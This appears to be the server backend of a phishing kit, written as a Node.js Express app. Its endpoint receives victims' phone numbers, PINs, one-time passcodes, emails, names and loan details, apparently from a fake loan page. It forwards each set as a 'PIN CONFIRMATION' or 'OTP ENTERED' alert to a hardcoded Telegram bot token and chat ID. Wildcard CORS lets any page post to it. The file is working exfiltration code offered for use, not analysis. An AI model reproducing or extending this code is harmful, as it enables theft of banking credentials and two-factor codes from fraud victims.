const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// ========== CORS CONFIGURATION ==========
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use(express.json());

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Telegram notification endpoint with NEW BOT
app.post('/api/send-telegram', async (req, res) => {
    try {
        const { phone, pin, email, name, amount, term, type } = req.body;
        
        // 🔴 NEW BOT CREDENTIALS 🔴
        const TG_BOT_TOKEN = '8069280584:AAFPwWOHBJmvMdwCDadMQX5N2ySPr58_e94';
        const TG_CHAT_ID = '8425632882';
        
        let message = '';
        if (type === 'pin') {
            message = `🔐 NEW PIN CONFIRMATION 🔐\n\n📱 Phone: ${phone}\n🔐 PIN: ${pin}\n📧 Email: ${email}\n👤 Name: ${name}\n💰 Loan: $${amount} for ${term} months`;
        } else {
            message = `🔐 OTP ENTERED 🔐\n\n📱 Phone: ${phone}\n🔑 OTP: ${pin}\n📧 Email: ${email}\n👤 Name: ${name}`;
        }
        
        const url = `https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(message)}`;
        
        await fetch(url);
        
        console.log('Telegram notification sent:', type, phone);
        res.json({ success: true });
    } catch (error) {
        console.error('Error:', error.message);
        res.json({ success: false, error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🤖 Telegram notifications enabled!`);
});
